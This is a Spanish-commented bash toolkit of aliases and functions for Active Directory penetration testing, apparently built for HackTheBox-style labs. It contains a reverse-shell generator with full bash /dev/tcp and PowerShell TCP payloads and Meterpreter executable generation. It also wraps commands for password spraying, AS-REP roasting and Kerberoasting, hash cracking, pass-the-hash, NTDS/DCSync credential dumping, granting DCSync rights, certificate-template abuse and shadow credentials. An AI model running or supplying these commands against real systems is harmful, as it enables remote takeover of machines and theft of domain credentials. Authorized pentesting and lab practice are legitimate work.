#!/bin/bash
#
#  _   _  ______ ______  _   _   __  __ 
# | \ | ||  ____||  ____|| \ | | |  \/  |
# |  \| || |__   | |__   |  \| | | \  / |
# | . ` ||  __|  |  __|  | . ` | | |\/| |
# | |\  || |____ | |____ | |\  | | |  | |
# |_| \_||______||______||_| \_||_|  |_|
#
# ARSENAL DE NEENAH v7.3 - SPEEDRUN EDITION AD
# Kit de herramientas de shell para operaciones de pentesting en Active Directory.
#

# ===================================================================
# 1. UTILIDADES GENERALES (COMPARTIDAS)
# ===================================================================

# Inicia un servidor web rápido en el directorio actual.
# Uso: serve [puerto] (por defecto 8000)
serve() { local port="${1:-8000}"; echo -e "[\e[92m+\e[0m] Sirviendo archivos en http://0.0.0.0:$port ..."; python3 -m http.server "$port"; }

# Inicia un listener de Netcat.
# Uso: listen [puerto] (por defecto 443)
listen() { local port="${1:-443}"; echo -e "[\e[92m+\e[0m] Escuchando en el puerto $port..."; sudo nc -lvnp "$port"; }

# Copia la IP de la interfaz tun0 (o la especificada) al portapapeles.
# Uso: tunip [interfaz] (por defecto tun0)
tunip() { local iface="${1:-tun0}"; local ip=$(ip -4 addr show "$iface" 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}'); if [ -n "$ip" ]; then echo -n "$ip" | xclip -sel clip; echo -e "[\e[92m+\e[0m] IP de $iface [\e[96m$ip\e[0m] copiada al portapapeles."; else echo "[-] Interfaz '$iface' no encontrada o sin IP." >&2; fi; }

# Sincroniza la hora de tu sistema con el controlador de dominio (DC).
# Esto es crucial para que los ataques Kerberos funcionen correctamente.
# Uso: timesync <IP_DC>
timesync() { if [ -z "$1" ]; then echo "[i] Uso: timesync <IP_DC>"; return 1; fi; sudo ntpdate "$1"; }


# ===================================================================
# 2. RECONOCIMIENTO Y ENUMERACIÓN INICIAL
# ===================================================================

# Escanea puertos comunes de Active Directory (AD) con Nmap.
# Uso: scan-ad <IP_DC> [argumentos_nmap_adicionales]
scan-ad() { if [ -z "$1" ]; then echo "[i] Uso: scan-ad <IP_DC>"; return 1; fi; mkdir -p "$1/nmap"; echo "[+] Escaneando AD en $1..."; sudo nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV -T4 -oN "$1/nmap/ad_scan.nmap" "$1" "${@:2}"; }

# Inicia un listener de Responder para ataques de LLMNR/NBT-NS/MDNS poisoning.
# Uso: responder <interfaz> (ej. tun0)
responder() { if [ -z "$1" ]; then echo "[i] Uso: responder <interfaz>"; return 1; fi; sudo responder -I "$1" -v; }

# Ejecuta comandos de enumeración LDAP usando NetExec (nxc).
# Uso: nxc-ldap <IP_DC> -u <usuario> -p <contraseña> -d <dominio> [opciones_nxc]
# Ejemplos de opciones: --users, --groups, --shares, --passwordspray, --asreproast, --kerberoasting
nxc-ldap() { nxc ldap "$@"; }


# ===================================================================
# 3. PAYLOADS Y SHELLS
# ===================================================================

# Genera y copia al portapapeles una reverse shell.
# Uso: revshell <tipo> <ip_atacante> <puerto_listener>
# Tipos soportados: bash, powershell
revshell() { local t=$1; local i=$2; local p=$3; local pl=""; case $t in bash) pl="bash -i >& /dev/tcp/$i/$p 0>&1";; powershell) pl="powershell -nop -c \"\$client=New-Object System.Net.Sockets.TCPClient('$i',$p);\$stream=\$client.GetStream();[byte[]]\$bytes=0..65535|%{0};while((\$i=\$stream.Read(\$bytes,0,\$bytes.Length)) -ne 0){;\$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i);\$sendback=(iex \$data 2>&1|Out-String);\$sendback2=\$sendback+'PS '+(pwd).Path+'> ';\$sendbyte=([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\"";; *) echo "[-] Tipos: bash, powershell"; return 1;; esac; echo "$pl" | xclip -sel clip; echo -e "[\e[92m+\e[0m] Reverse shell de [\e[96m$t\e[0m] copiada."; }

# Genera rápidamente un ejecutable de Meterpreter (Windows) con msfvenom.
# Uso: gen-exe <ip_atacante> <puerto_listener> <nombre_salida.exe>
gen-exe() { msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 -f exe -o $3; echo "[+] Payload $3 creado."; }


# ===================================================================
# 4. ACTIVE DIRECTORY: ENUMERACIÓN Y ATAQUES DE AUTENTICACIÓN
# ===================================================================

# Kerbrute: Enumera usuarios válidos en un dominio.
# Uso: kb-users <IP_DC> <dominio> <ruta_lista_usuarios>
kb-users() { kerbrute userenum --dc "$1" -d "$2" "$3"; }

# Kerbrute: Realiza un ataque de password spraying.
# Uso: kb-spray <IP_DC> <dominio> <ruta_lista_usuarios> <contraseña_o_ruta_lista_contraseñas>
kb-spray() { kerbrute passwordspray --dc "$1" -d "$2" "$3" "$4"; }

# Impacket: Realiza un ataque de AS-REP Roasting para obtener hashes de usuarios sin preautenticación.
# Uso: asrep <IP_DC> <dominio.local>
alias asrep='impacket-GetNPUsers.py -dc-ip $1 -request -format hashcat -outputfile asrep_hashes.txt $2/'

# Impacket: Realiza un ataque de Kerberoasting para obtener hashes de SPNs.
# Uso: keroast <IP_DC> <dominio/usuario:contraseña>
alias keroast='impacket-GetUserSPNs.py -dc-ip $1 -request -format hashcat -outputfile kerberoast_hashes.txt $2'

# Impacket: Obtiene un Ticket Granting Ticket (TGT) para autenticación Kerberos.
# Puedes usar contraseña o un hash (Pass-the-Hash).
# Uso: get-tgt <IP_DC> <dominio>/<usuario>:<contraseña_o_hash> [opciones_adicionales_impacket]
# Ejemplo con contraseña: get-tgt 10.10.11.76 voleur.htb/svc_winrm:password
# Ejemplo con hash: get-tgt 10.10.11.76 voleur.htb/Administrator -hashes :e656e07c56d831611b577b160b259ad2
get-tgt() {
    local dc_ip="$1"
    local user_info="$2"
    shift 2
    impacket-getTGT.py -dc-ip "$dc_ip" "$user_info" "$@"
    echo "[+] TGT generado. Usa 'set-krb5ccname' para configurar la variable de entorno."
}

# Configura la variable de entorno KRB5CCNAME para usar el TGT generado por get-tgt.
# Esto permite que otras herramientas usen el ticket Kerberos.
# Uso: set-krb5ccname <nombre_archivo_ccache> (ej. svc_winrm.ccache)
set-krb5ccname() { if [ -z "$1" ]; then echo "[i] Uso: set-krb5ccname <nombre_archivo_ccache>"; return 1; fi; export KRB5CCNAME="$(pwd)/$1"; echo "[+] KRB5CCNAME configurado a: $KRB5CCNAME"; }

# John The Ripper: Crackea hashes de AS-REP (modo 18200).
# Uso: crack-asrep <archivo_hashes> <ruta_wordlist>
alias crack-asrep='john --format=krb5asrep --wordlist=$2 $1'

# John The Ripper: Crackea hashes de Kerberoast (modo 13100).
# Uso: crack-keroast <archivo_hashes> <ruta_wordlist>
alias crack-keroast='john --format=krb5tgs --wordlist=$2 $1'

# Hashcat: Crackea hashes de AS-REP (modo 18200).
# Uso: hcat-asrep <archivo_hashes> <ruta_wordlist>
alias hcat-asrep='hashcat -m 18200 -a 0 $1 $2'

# Hashcat: Crackea hashes de Kerberoast (modo 13100).
# Uso: hcat-keroast <archivo_hashes> <ruta_wordlist>
alias hcat-keroast='hashcat -m 13100 -a 0 $1 $2'


# ===================================================================
# 5. ACTIVE DIRECTORY: MOVIMIENTO LATERAL Y ACCESO
# ===================================================================

# NetExec SMB: Realiza enumeración y ejecución de comandos vía SMB.
# Uso: nxc-smb <IP> -u <usuario> -p '<contraseña>' -d <dominio> [opciones_nxc]
# Ejemplos de opciones: --users, --groups, --shares, --exec-module, etc.
nxc-smb() { nxc smb "$@"; }

# BloodyAD: Dumper toda la información del dominio.
# Uso: b-dump <dominio> <usuario_admin> '<contraseña_admin>'
b-dump() { bloodyad -d "$1" -u "$2" -p "$3" get all; }

# BloodyAD: Añade un nuevo usuario al dominio.
# Uso: b-adduser <dominio> <usuario_admin> '<contraseña_admin>' <nuevo_usuario> <nueva_contraseña>
b-adduser() { bloodyad -d "$1" -u "$2" -p "$3" add user "$4" "$5"; }

# Evil-WinRM: Inicia una shell interactiva WinRM.
# Uso: ewinrm <IP> <usuario> '<contraseña>'
alias ewinrm='evil-winrm -i $1 -u $2 -p "$3"'

# Evil-WinRM: Inicia una shell interactiva WinRM usando Pass-the-Hash.
# Uso: ewinrm-pth <IP> <usuario> <hash_NTLM>
alias ewinrm-pth='evil-winrm -i $1 -u $2 -H "$3"'

# Evil-WinRM: Inicia una shell interactiva WinRM usando autenticación Kerberos (con KRB5CCNAME).
# Uso: ewinrm-krb <IP> <usuario> <dominio>
alias ewinrm-krb='evil-winrm -i $1 -k -u $2 -r $3'

# Impacket wmiexec.py: Ejecuta comandos vía WMI usando Pass-the-Hash.
# Uso: pth-wmi <hash_NTLM> <dominio/usuario@IP>
alias pth-wmi='impacket-wmiexec.py -hashes "aad3b435b51404eeaad3b435b51404ee:$1" "$2"'


# ===================================================================
# 6. ACTIVE DIRECTORY: PERSISTENCIA Y ESCALADA DE PRIVILEGIOS
# ===================================================================

# SecretsDump (Impacket): Dumpea hashes SAM/LSA/NTDS.
# Uso: secdump <dominio/usuario:contraseña@IP>
alias secdump='impacket-secretsdump.py'

# DCSync (Impacket): Dumpea hashes usando el privilegio DCSync.
# Uso: dcsync <dominio/usuario:contraseña>
alias dcsync='impacket-secretsdump.py -just-dc'

# BloodyAD: Otorga el privilegio DCSync a un usuario.
# Uso: b-give-dcsync <dominio> <usuario_admin> '<contraseña_admin>' <usuario_objetivo>
b-give-dcsync() { bloodyad -d "$1" -u "$2" -p "$3" set-right "$4" DCSync; }

# BloodyAD: Otorga el permiso GenericAll sobre un objeto.
# Uso: b-give-genericall <dominio> <usuario_admin> '<contraseña_admin>' <usuario_objetivo>
b-give-genericall() { bloodyad -d "$1" -u "$2" -p "$3" set-right "$4" GenericAll; }


# ===================================================================
# 7. BLOODHOUND Y AD CS (CERTIFICATE SERVICES)
# ===================================================================

# Inicia/Para los servicios de BloodHound (Neo4j y BloodHound GUI).
# Uso: bh <start|stop>
bh() { case $1 in start) sudo neo4j console & sleep 10 && bloodhound --no-sandbox;; stop) sudo neo4j stop;; *) echo "[i] Uso: bh <start|stop>";; esac; }

# Colector de BloodHound (bloodhound-python).
# Uso: bh-collect <usuario> '<contraseña>' <IP_DC> <dominio.local>
bh-collect() { bloodhound-python -u "$1" -p "$2" -ns "$3" -d "$4" -c all; }

# Certipy: Encuentra plantillas de certificados vulnerables.
# Uso: cp-find <dominio>/<usuario>:<contraseña> -dc-ip <IP_DC>
alias cp-find='certipy-ad find -vulnerable -stdout'

# Certipy: Solicita un certificado (ataque ESC1).
# Uso: cp-req <dominio>/<usuario>:<contraseña> -dc-ip <IP_DC> -ca <nombre_ca> -template <plantilla>
alias cp-req='certipy-ad req'

# Certipy: Autentica usando un certificado (Pass-the-Certificate).
# Uso: cp-auth <ruta_certificado.pfx>
alias cp-auth='certipy-ad auth -pfx'

# Certipy: Realiza un ataque de Shadow Credentials.
# Uso: cp-shadow <ruta_archivo_pfx> <usuario_a_comprometer>
cp-shadow() { certipy-ad shadow -pfx "$1" -u "$2" -action add; }


# ===================================================================
# NOTAS IMPORTANTES PARA KERBEROS
# ===================================================================
# Para que los ataques Kerberos funcionen correctamente, es crucial configurar
# el archivo /etc/krb5.conf. Aquí tienes un ejemplo de configuración para un dominio como VOLEUR.HTB:
#
# [libdefaults]
#     default_realm = VOLEUR.HTB
#     dns_lookup_realm = false
#     dns_lookup_kdc = false
#
# [realms]
#     VOLEUR.HTB = {
#         kdc = 10.10.11.76
#         admin_server = 10.10.11.76
#     }
#
# [domain_realm]
#     .voleur.htb = VOLEUR.HTB
#     voleur.htb = VOLEUR.HTB
#
# Asegúrate de reemplazar 'VOLEUR.HTB' y '10.10.11.76' con los valores de tu objetivo.
# Puedes editar este archivo manualmente o usar un script para automatizarlo.
#

echo -e "\n[\e[92m+\e[0m] Arsenal de Neenah v7.3 (Speedrun Edition) cargado. ¡Dominación total!"
